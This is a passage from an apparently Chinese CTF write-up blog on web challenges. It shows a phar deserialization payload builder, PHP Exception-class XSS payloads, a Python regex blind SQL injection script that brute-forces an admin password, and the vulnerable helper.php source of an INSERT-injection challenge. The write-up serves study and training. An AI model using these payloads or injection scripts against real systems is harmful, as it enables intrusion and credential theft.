<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;test.txt&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>之后利用name参数触发phar://协议，再任意上传一个文件即可拿到flag。</p> <h3 id="xss之光"><a href="#xss之光" class="header-anchor">#</a> xss之光</h3> <p>看似XSS，实则考PHP原生类的反序列化</p> <p><strong>考点：</strong></p> <ul><li><strong>PHP原生类反序列化漏洞</strong></li></ul> <p>题目存在git源码泄露，恢复一下，源码如下：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//index.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>无法构造POP链的时候考虑用一下PHP原生类，参考文章：<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener noreferrer">这里<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <ul><li>toString()方法：当一个对象被当做字符串的时候触发</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720181034.png" alt="image-20200720181027058"></p> <p>由于服务器PHP版本是5.6，所以用<em>Exception</em>类来打。利用echo来触发<em>Exception</em>类中的toString()方法，从而造成XSS。</p> <p>生成payload：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;script&gt;alert&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>传参：</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720181232.png" alt="image-20200720181232219" style="zoom:67%;"> <p>XSS成功，但是看了一下响应头中并没有带出flag，看了一下WP好像是题目的问题？😐要传一个产生跳转的payload来带出flag：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>Burp抓一下包放到Repeater模块重发一下，在响应头就能看到带出的flag：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720182116.png" alt="image-20200720182116196"></p> <h3 id="harekazectf2019-easy-notes"><a href="#harekazectf2019-easy-notes" class="header-anchor">#</a> [HarekazeCTF2019]Easy Notes</h3> <p><strong>考点：</strong></p> <ul><li><strong>session文件伪造</strong></li> <li><strong>session反序列化</strong></li></ul> <h2 id="sql注入"><a href="#sql注入" class="header-anchor">#</a> SQL注入</h2> <h3 id="sqli"><a href="#sqli" class="header-anchor">#</a> SQLi</h3> <p><strong>考点：正则盲注</strong></p> <p>提示SQL注入，输了几个关键字均弹窗‘hacker’，简单做了一下FUZZ测试，发现还是有几个字符可以使用：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223435.png" alt="image-20200713223435354"></p> <p>接着扫了个后台，扫到了hint.txt</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223512.png" alt="image-20200713223512297"></p> <p>hint.txt的内容：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713223535.png" alt="image-20200713223535231"></p> <p>可以看到一些常规的SQL注入关键字都被过滤掉了，然后提示我们只要拿到admin的密码，就可以得到flag了。另外，首页告诉了我们查询的sql语句：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713235335.png" alt="image-20200713223704573"></p> <p>考虑用反斜杠进行转义，双引号和正则没被过滤，然后passwd和username还在一张表里面，用正则盲注吧。。</p> <p>没法用注释符号，考虑用%00进行截断。</p> <p>exp如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

url <span class="token operator">=</span> <span class="token string">'http://e3fe3f17-c256-42fe-81f2-7fcd51370966.nodebuuoj.cn/'</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
password <span class="token operator">=</span> <span class="token string">''</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'1234567890!@#$%&amp;()-=[];{}:&quot;&lt;&gt;_qwertyuiopasdfghjklzxcvbnm'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
            <span class="token string">&quot;passwd&quot;</span><span class="token punctuation">:</span> <span class="token string">'||passwd/**/REGEXP/**/&quot;^{}&quot;;\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>password <span class="token operator">+</span> j<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            password <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>不过有点奇怪的是burp跑出来的状态码是302，到python里就成了404了··· 搞不懂</p> <p>然后注意%00在python里用十六进制表示成\x00即可</p> <p>跑出来的密码：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713234428.png" alt="image-20200713234353205"></p> <p>用户名任意，登录即可</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200713234630.png" alt="image-20200713234630437"></p> <h3 id="不是文件上传"><a href="#不是文件上传" class="header-anchor">#</a> 不是文件上传</h3> <p><strong>考点：</strong></p> <ul><li><strong>INSERT注入</strong></li> <li><strong>反序列化</strong></li></ul> <p>BUUOJ的环境题目直接给了github的源码，clone下来，源码如下(部分关键位置已经做了注释)：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//helper.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
	<span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;pic/&quot;</span><span class="token punctuation">;</span>
	<span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span> 
	<span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;config.txt&quot;</span><span class="token punctuation">;</span>
	<span class="token comment">// The function is not yet perfect, it is not open yet.</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//getfile-&gt;check</span>
		<span class="token comment">//返回一个储存上传的文件信息的数组</span>
		<span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//复制给新创建的数组$array</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;title&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;filename&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;ext&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;path&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token comment">//getimagesize函数返回一个图片信息的数组，包含图片高度宽度等</span>
		<span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;width&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;height&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//以序列化字符串的形式存储图像高度和宽度</span>
		<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;attr&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Something wrong!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//上传的文件的名称</span>
		<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//只允许上传以下四种后缀名的文件</span>
		<span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpeg&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Something wrong!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>	
		<span class="token comment">//mysql连接</span>
		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;r00t&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;pic_base&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{</span> 
		    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Connect MySQL Fail:&quot;</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;`&quot;</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;`&quot;</span><span class="token punctuation">;</span>
			<span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token comment">//implode() 函数返回一个由数组元素组合成的字符串。</span>
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;INSERT INTO images (&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;,&quot;</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;) VALUES(&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;,&quot;</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">;</span>
		<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//mysqli_insert_id() 函数返回最后一个查询中生成的ID值</span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token boolean constant">False</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>
			<span class="token comment">//The function is not yet perfect, it is not open yet.</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token shell-comment comment"># Read some config html</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span 